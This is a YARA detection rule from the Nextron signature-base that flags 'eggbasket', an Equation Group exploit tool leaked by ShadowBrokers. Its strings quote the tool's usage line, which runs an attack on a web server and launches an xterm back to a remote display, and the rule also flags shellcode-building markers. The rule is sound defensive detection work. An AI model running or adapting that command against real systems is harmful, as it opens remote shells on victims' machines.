rule SIGNATURE_BASE_Equationgroup_Eggbasket : FILE
{
	meta:
		description = "Equation Group hack tool leaked by ShadowBrokers- file eggbasket"
		author = "Florian Roth (Nextron Systems)"
		id = "3fb1388a-e6b8-5c7a-ad23-ddbfc9d33d56"
		date = "2017-04-08"
		modified = "2023-12-05"
		reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c04cde449bdf5fb40bb001fb663d32a70f89abe4/yara/apt_eqgrp_apr17.yar#L417-L432"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c04cde449bdf5fb40bb001fb663d32a70f89abe4/LICENSE"
		logic_hash = "e4800d5c820a18d3483dc5c055c0e2f5374ce3b160ecb4d940a00ec4a90ca50d"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "b078a02963610475217682e6e1d6ae0b30935273ed98743e47cc2553fbfd068f"

	strings:
		$x1 = "# Building Shellcode into exploit." fullword ascii
		$x2 = "%s -w /index.html -v 3.5 -t 10 -c \"/usr/openwin/bin/xterm -d 555.1.2.2:0&\"  -d 10.0.0.1 -p 80" fullword ascii
		$x3 = "# STARTING EXHAUSTIVE ATTACK AGAINST " fullword ascii

	condition:
		( uint16(0)==0x457f and filesize <90KB and 1 of them ) or (2 of them )
}
